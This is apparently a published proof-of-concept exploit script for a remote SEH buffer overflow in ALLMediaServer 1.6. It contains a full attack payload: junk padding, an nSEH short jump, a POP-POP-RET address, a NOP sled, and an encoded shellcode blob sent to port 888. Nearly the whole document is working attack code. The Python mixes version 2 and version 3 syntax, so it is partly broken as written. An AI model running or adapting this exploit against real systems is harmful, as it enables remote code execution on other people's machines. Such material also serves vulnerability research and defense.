# Exploit Title:  ALLMediaServer 1.6 Remote - Buffer Overflow (SEH)
# Exploit Author: Hejap Zairy
# Date: 1.08.2022
# Vendor Homepage: https://www.allmediaserver.org
# Software Link: https://www.allmediaserver.org/LiveUpdate/ALLMediaServer.exe
# Tested Version: v1.6(07-11-2020) 
# Tested on: Windows 10 64bit
# Original Dos Author: Yehia Elghaly
# Original DoS Link: https://packetstormsecurity.com/files/166465/ALLMediaServer-1.6-Remote-Buffer-Overflow.html

# Description: ALLMediaServer 1.6 Remote Buffer Overflow

# Steps to reproduce:
# 1. - ALLMediaServer 1.6 listening on port 888 
# 2. - Run the Script from remote TCP/IP
# 3. - Mediaserver.exe Exploit 

# Proof and Exploit:
#https://streamable.com/lwgyjs
#https://i.imgur.com/p4paL8R.png



#Auther Hejap Zairy 

import socket
import struct

print("######################################################")
print("# ALLMediaServer 1.6 Remote (Buffer Overflow)        #")
print("#             --------------------------           #")
print("#               BY  Hejap Zairy                     #")
print("######################################################")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


buf =  b""
buf += b"\xda\xd3\xbb\x39\x9e\x51\x98\xd9\x74\x24\xf4\x5f\x29"
buf += b"\xc9\xb1\x59\x31\x5f\x19\x83\xc7\x04\x03\x5f\x15\xdb"
buf += b"\x6b\xad\x70\x94\x94\x4e\x81\xca\xa5\x9c\x08\xef\xa2"
buf += b"\xab\x59\xdf\xa1\xfe\x51\x94\xe4\xea\xe2\xd8\x20\x1c"
buf += b"\x42\x56\x17\x13\x53\x57\x97\xff\x97\xf6\x6b\x02\xc4"
buf += b"\xd8\x52\xcd\x19\x19\x92\x9b\x54\xf6\x4e\x97\xc5\x18"
buf += b"\x38\x2c\xab\x24\xc7\xe2\xa7\x14\xbf\x87\x78\xe0\x73"
buf += b"\x89\xa8\x83\xc4\x91\x18\x18\x8c\x81\x99\xcd\xa8\x0b"
buf += b"\xed\xcd\x83\x74\x47\xa6\xd0\x01\x59\x6e\x29\xd6\xf6"
buf += b"\x4f\x85\xdb\x07\x88\x22\x04\x72\xe2\x50\xb9\x85\x31"
buf += b"\x2a\x65\x03\xa5\x8c\xee\xb3\x01\x2c\x22\x25\xc2\x22"
buf += b"\x8f\x21\x8c\x26\x0e\xe5\xa7\x53\x9b\x08\x67\xd2\xdf"
buf += b"\x2e\xa3\xbe\x84\x4f\xf2\x1a\x6a\x6f\xe4\xc3\xd3\xd5"
buf += b"\x6f\xe1\x02\x69\x90\xf9\x2a\x37\x06\x35\xe7\xc8\xd6"
buf += b"\x51\x70\xba\xe4\xfe\x2a\x54\x44\x76\xf5\xa3\xdd\x90"
buf += b"\x06\x7b\x65\xf0\xf8\x7c\x95\xd8\x3e\x28\xc5\x72\x96"
buf += b"\x51\x8e\x82\x17\x84\x3a\x89\x8f\xe7\x12\xb5\x20\x80"
buf += b"\x60\xc6\xbf\xeb\xed\x20\xef\x5b\xbd\xfc\x50\x0c\x7d"
buf += b"\xad\x38\x46\x72\x92\x59\x69\x59\xbb\xf0\x86\x37\x93"
buf += b"\x6c\x3e\x12\x6f\x0c\xbf\x89\x15\x0e\x4b\x3b\xe9\xc1"
buf += b"\xbc\x4e\xf9\x36\xdb\xb0\x01\xc7\x4e\xb0\x6b\xc3\xd8"
buf += b"\xe7\x03\xc9\x3d\xcf\x8b\x32\x68\x4c\xcb\xcd\xed\x64"
buf += b"\xa7\xf8\x7b\xc8\xdf\x04\x6c\xc8\x1f\x53\xe6\xc8\x77"
buf += b"\x03\x52\x9b\x62\x4c\x4f\x88\x3e\xd9\x70\xf8\x93\x4a"
buf += b"\x19\x06\xcd\xbd\x86\xf9\x38\xbe\xc1\x05\xbe\xe9\x69"
buf += b"\x6d\x40\xaa\x89\x6d\x2a\x2a\xda\x05\xa1\x05\xd5\xe5"
buf += b"\x4a\x8c\xbe\x6d\xc0\x41\x0c\x0c\xd5\x4b\xd0\x90\xd6"
buf += b"\x78\xc9\x23\xac\xf1\xee\xc4\x51\x18\x8b\xc5\x51\x24"
buf += b"\xad\xfa\x87\x1d\xdb\x3d\x14\x1a\xd4\x08\x39\x0b\x7f"
buf += b"\x72\x6d\x4b\xaa"



##1076
junk =  'B' * 1072 + '\xeb\x0A\x90\x90' #1076 jmp short 10 nseh

seh = junk  + struct.pack('<I',0x40590B) 
#0040590B      POP ESI



buffer = seh   + "\x90" * 100 + buf + "\x90" * (2000  - len(seh) - len(buf))


try:
  s.connect(('127.0.0.1', 888))
  s.sendall(buffer)
  data = s.recv(1024)
  s.close()
  print "Media is Out"
except socket.error, msg:
  print ""
  print "Couldnt connect with Mediaserver"



